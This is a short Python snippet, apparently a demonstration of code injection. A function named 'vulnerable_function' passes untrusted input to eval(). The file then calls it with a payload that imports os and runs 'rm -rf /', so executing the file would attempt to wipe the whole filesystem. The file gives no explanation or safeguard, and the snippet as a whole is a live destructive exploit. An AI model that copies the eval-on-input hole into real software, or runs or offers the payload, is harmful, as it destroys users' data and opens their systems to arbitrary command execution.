import os

def vulnerable_function(user_input):
    eval(user_input)

vulnerable_function("__import__('os').system('rm -rf /')")
